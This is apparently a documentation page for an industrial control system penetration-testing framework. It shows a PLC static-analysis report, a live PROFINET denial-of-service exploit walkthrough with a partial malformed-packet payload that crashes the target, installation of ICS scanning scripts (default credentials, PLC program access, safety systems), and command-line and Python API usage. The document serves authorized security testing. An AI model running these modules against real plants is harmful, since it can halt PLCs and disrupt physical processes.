  Description : The `xCommOK` watchdog timer does not drive the output to
                a safe state on timeout. If communication is lost for >5s,
                the last command remains active indefinitely.
  Impact      : Stuck-at-last-value on comm loss; loss of safe state.
  CWE         : CWE-440 (Expected Behavior Violation)
  MITRE ICS   : T0881 (Service Stop)
  Remediation : On `xCommOK` timeout, immediately set all controlled
                outputs to the defined safe position (valve closed, pump off).

  FINDING 004 — MEDIUM
  ─────────────────────────────────────────────────────────────────────────
  Title       : No range validation on Modbus-written analog setpoints
  Location    : Line 201-218, Function FC_WriteSetpoints
  Description : Modbus FC16 writes to holding registers are applied
                directly to physical output analog values without bounds
                checking. Values outside engineering range will cause
                actuator rail conditions.
  Impact      : Actuator damage; process disruption.
  Remediation : Add LIMIT() function call around all Modbus-written values.

  FINDING 005 — LOW
  ─────────────────────────────────────────────────────────────────────────
  Title       : Unused debug output retained in production code
  Location    : Lines 589-601
  Description : Debug output block writing to %Q0.7 (physical digital
                output) remains active in production build. Unintended
                digital output could drive relay.
  Remediation : Remove debug output block or protect with compile-time flag.

  ─────────────────────────────────────────────────────────────────────────
  Summary: 5 findings (1 CRITICAL, 2 HIGH, 1 MEDIUM, 1 LOW)
  ─────────────────────────────────────────────────────────────────────────
  SAST report saved: ./sast-report-reactor_control-2026-06-01.json
  ═══════════════════════════════════════════════════════════════════════════
```

---

## Session 7: Live Exploit Walkthrough (Lab Environment Only)

> **Warning:** This session demonstrates the full DestructiveMode gate. Only run this against systems you own or have explicit written authorization to test. All destructive operations are logged.

```
ixf > use cve/siemens/cve_2019_13946_s7_profinet_dos

[*] Module loaded: CVE-2019-13946 Siemens PROFINET DoS
[*] CVE: CVE-2019-13946 | CVSS: 7.5 | Impact: HIGH

ixf (CVE-2019-13946 Siemens PROFINET DoS) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (CVE-2019-13946 Siemens PROFINET DoS) > set simulate false
[*] simulate => False
[!] LIVE MODE ENABLED — packets will be sent to target.

ixf (CVE-2019-13946 Siemens PROFINET DoS) > show options

  +──────────────────+──────────────+──────────+──────────────────────────────────────────+
  | Option           | Value        | Required | Description                              |
  +──────────────────+──────────────+──────────+──────────────────────────────────────────+
  | target           | 192.168.1.100| yes      | Target Siemens device IP                 |
  | interface        | eth0         | no       | Network interface for PROFINET L2        |
  | count            | 1            | no       | Number of malformed DCP packets          |
  | delay            | 0            | no       | Delay between packets (ms)               |
  | simulate         | False        | no       | Simulate mode (currently: DISABLED)      |
  | destructive      | False        | no       | REQUIRED for HIGH impact modules         |
  +──────────────────+──────────────+──────────+──────────────────────────────────────────+

ixf (CVE-2019-13946 Siemens PROFINET DoS) > set destructive true
[*] destructive => True

ixf (CVE-2019-13946 Siemens PROFINET DoS) > run

  ████████████████████████████████████████████████████████████████████████
  ██  DESTRUCTIVE MODE — HIGH IMPACT                                     ██
  ████████████████████████████████████████████████████████████████████████

  Module  : CVE-2019-13946 Siemens PROFINET DoS
  Target  : 192.168.1.100
  CVE     : CVE-2019-13946
  CVSS    : 7.5 (HIGH)
  Impact  : Device crash / reboot. PLC STOP state. Physical process interruption.
  Action  : Send malformed PROFINET DCP Identify Request to cause device fault.

  WARNING: This action may cause the target device to crash and restart.
           Process disruption, data loss, and physical impact are possible.
           This operation will be logged to .log/destructive_ops_2026-06-01.log

  Type the following string exactly to confirm:
  I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION

  Confirmation> I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION
[+] Confirmed. Executing CVE-2019-13946...
[*] Constructing malformed PROFINET DCP Identify Request...
[*] Payload (hex):
    ff ff ff ff ff ff  [src_mac]  88 92 fe fe 05 00 00 00 00 04 ff ff
    00 00 [malformed_tlv_overflow_data]
[*] Sending via raw socket on eth0...
[*] Packet sent (1 packet, 64 bytes)
[*] Waiting for response (timeout: 5s)...
[!] No response received — device may have crashed or dropped connection
[+] Result: Device at 192.168.1.100 stopped responding after malformed DCP packet
[+] CVE-2019-13946 confirmed exploitable on target
[!] DESTRUCTIVE OPERATION LOGGED: .log/destructive_ops_2026-06-01.log
[!] Verify device recovery: ping 192.168.1.100 or check PLC status LED

ixf (CVE-2019-13946 Siemens PROFINET DoS) >
```

---

## Session 8: NSE Integration Quick Start

```
ixf > nse status

  NSE Scripts — Status
  ═══════════════════════════════════════════════════════════════════════════
  Nmap version    : 7.95 (found at /usr/bin/nmap)
  Scripts dir     : /usr/share/nmap/scripts/
  ─────────────────────────────────────────────────────────────────────────
  Script                   Installed   Version   Category
  ─────────────────────────────────────────────────────────────────────────
  ics-sweep.nse            NO          1.0.12    discovery, intrusive
  ics-default-creds.nse    NO          1.0.12    auth, intrusive
  ics-plc-program-access   NO          1.0.12    intrusive
  ics-safety-systems.nse   NO          1.0.12    intrusive
  ics-firmware-version.nse NO          1.0.12    safe, discovery
  ics-historian-discover   NO          1.0.12    discovery
  ics-enumerate.nse        NO          1.0.12    discovery, intrusive
  ics-honeypot-detect.nse  NO          1.0.12    safe, detection
  ─────────────────────────────────────────────────────────────────────────
  Status: 0/8 scripts installed
  Run 'nse install' to install scripts to Nmap scripts directory

ixf > nse install

[*] Installing IXF NSE scripts to /usr/share/nmap/scripts/...
[*] Copying ics-sweep.nse            ...  OK
[*] Copying ics-default-creds.nse    ...  OK
[*] Copying ics-plc-program-access.nse .. OK
[*] Copying ics-safety-systems.nse   ...  OK
[*] Copying ics-firmware-version.nse ...  OK
[*] Copying ics-historian-discover.nse .. OK
[*] Copying ics-enumerate.nse        ...  OK
[*] Copying ics-honeypot-detect.nse  ...  OK
[*] Running nmap --script-updatedb   ...  OK
[+] 8/8 NSE scripts installed successfully.
[i] Use: nmap --script ics-sweep.nse <target>
[i] Use: nmap --script 'ics-*' <target>   (all IXF scripts)

ixf > nse run ics-sweep.nse 192.168.1.0/24

[*] Running: nmap --script ics-sweep.nse -p 102,502,4840,47808,20000,2404,44818 192.168.1.0/24
[*] Nmap output:

Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 18:50 UTC
Nmap scan report for 192.168.1.50
Host is up (0.0012s latency).
PORT      STATE SERVICE
102/tcp   open  iso-tsap
| ics-sweep:
|   Protocol: S7comm (Siemens S7 PLC detected)
|   Device:   SIMATIC S7-1500
|   Firmware: V2.9.5
|_  Risk:     HIGH — S7comm unauthenticated access

Nmap scan report for 192.168.1.100
Host is up (0.0009s latency).
PORT    STATE SERVICE
502/tcp open  modbus
| ics-sweep:
|   Protocol: Modbus TCP
|   Vendor:   Unknown (generic Modbus device)
|   Unit IDs: 1, 2, 3 (responded)
|_  Risk:     HIGH — Modbus TCP unauthenticated

Nmap done: 256 IP addresses (2 hosts up) scanned in 18.43 seconds
```

---

## Session 9: Non-Interactive Quick Start (One-Liners)

IXF supports a fully non-interactive command-line mode for CI/CD integration, scripting, and automation. Commands are passed as positional arguments:

```bash
# Load module, set target, run in simulate (default)
ixf use scanners/ics/modbus_detect set target 192.168.1.100 run

# Search and exit
ixf search CVE-2015-5374

# Output:
# [*] Search results for: CVE-2015-5374
#     use cve/siemens/cve_2015_5374_s7_300_400_dos

# Run scanner on CIDR range
ixf use scanners/ics/modbus_scanner set target 192.168.1.0/24 run

# Run assessment
ixf assess iec62443/zone_conduit_audit

# Generate JSON report
ixf assess nist_sp800_82/control_checklist report json

# MITRE coverage
ixf mitre-coverage

# MITRE technique sweep
ixf ttp T0843 192.168.1.100

# Stats
ixf stats

# Version
ixf --version

# Chained commands with semicolon (shell escaping required)
ixf "use scanners/ics/modbus_detect; set target 192.168.1.100; run"

# Shell redirection (save output)
ixf use scanners/ics/modbus_detect set target 192.168.1.100 run > scan_result.txt

# Using in a bash pipeline
ixf search modbus | grep "use " | head -5

# CI/CD example: scan + exit code based on findings
ixf assess iec62443/zone_conduit_audit report json && echo "Assessment complete"
```

### Non-Interactive with Python

```bash
# Use Python -c for complex chaining
python -c "
import subprocess, json, sys
result = subprocess.run(
    ['ixf', 'use', 'scanners/ics/modbus_detect', 'set', 'target', '192.168.1.100', 'run'],
    capture_output=True, text=True
)
print(result.stdout)
"
```

---

## Session 10: Python API Quick Start

IXF exposes a Python API for embedding in security tooling, custom scripts, and automated assessment pipelines.

```python
# Quick start: load and run a module via the Python API
from industrialxpl.core.exploit.loader import load_module
from industrialxpl.core.exploit.runner import run_module

# Load a scanner module
mod = load_module("scanners/ics/modbus_detect")

# Set options
mod.set_option("target", "192.168.1.100")
mod.set_option("port", 502)
mod.set_option("simulate", True)   # default, safe

# Run (returns structured result dict)
result = run_module(mod)

print(result)
# {
#   "module": "scanners/ics/modbus_detect",
#   "target": "192.168.1.100",
#   "simulate": True,
#   "status": "completed",
#   "finding": "DETECTED",
#   "mitre": ["T0888", "T0802"],
#   "timestamp": "2026-06-01T18:45:00Z"
# }
```

```python
# Search for modules by keyword
from industrialxpl.core.exploit.utils import search_modules, index_modules

# Index all modules
all_modules = index_modules()
print(f"Total: {len(all_modules)} modules")

# Search
results = search_modules("siemens")
for mod_path in results[:5]:
    print(f"  {mod_path}")
```

```python
# Run a MITRE technique sweep via API
from industrialxpl.core.mitre import run_ttp_sweep

results = run_ttp_sweep(technique_id="T0843", target="192.168.1.100", simulate=True)
for r in results:
    print(f"[{r['status']}] {r['module']}")
```

```python
# Generate a report
from industrialxpl.core.report import generate_report

# After running multiple modules, generate a report
report_path = generate_report(format="json", output_dir="./reports/")
print(f"Report saved: {report_path}")
```

```python
# Full assessment workflow
from industrialxpl.core.assessment import run_assessment

result = run_assessment("iec62443/zone_conduit_audit", target="192.168.1.0/24")
for check in result["checks"]:
    print(f"[{check['result']}] {check['name']}: {check['notes']}")
```

```python
# SAST analysis via API
from industrialxpl.core.sast import analyze_plc_file

findings = analyze_plc_file(
    filepath="/opt/plc-projects/reactor_control.st",
    provider="openai",
    api_key="sk-proj-...",
    sanitize=True
)

for finding in findings:
    print(f"[{finding['severity']}] {finding['title']} @ line {finding['line']}")
```

---

*Previous: [Installation](01-installation.md) | Next: [Shell Reference](03-shell-reference.md)*
